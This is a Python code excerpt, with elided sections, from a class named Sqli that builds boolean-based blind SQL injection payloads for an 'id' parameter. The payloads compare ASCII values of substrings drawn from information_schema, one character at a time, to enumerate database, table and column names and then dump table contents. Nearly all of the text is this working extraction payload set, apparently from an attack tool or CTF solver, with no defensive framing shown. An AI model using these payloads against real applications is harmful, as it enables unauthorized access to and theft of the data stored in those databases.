...
class Sqli():
    ...
    def database_query(self):
        databases = {
            'id': f"4 or (select(select ascii(substring(group_concat(schema_name),{self.position},1)) from information_schema.schemata)={self.char})",
        }
    ...
    def tables_query(self):
        tables = {
            'id': f"4 or (select(select ascii(substring(group_concat(table_name),{self.position},1)) from information_schema.tables where table_schema=CHAR({self.ascii_db}))={self.char})",
        }
    ...
    def columns_query(self):
        columns = {
            'id': f"4 or (select(select ascii(substring(group_concat(column_name),{self.position},1)) from information_schema.columns where table_schema=CHAR({self.ascii_db}) and table_name=CHAR({self.ascii_table}))={self.char})",
        }
    ...
    def data_query(self):
        data = {
            'id': f"4 or (select(select ascii(substring(group_concat({self.columns}),{self.position},1)) from {self.table})={self.char})"
        }
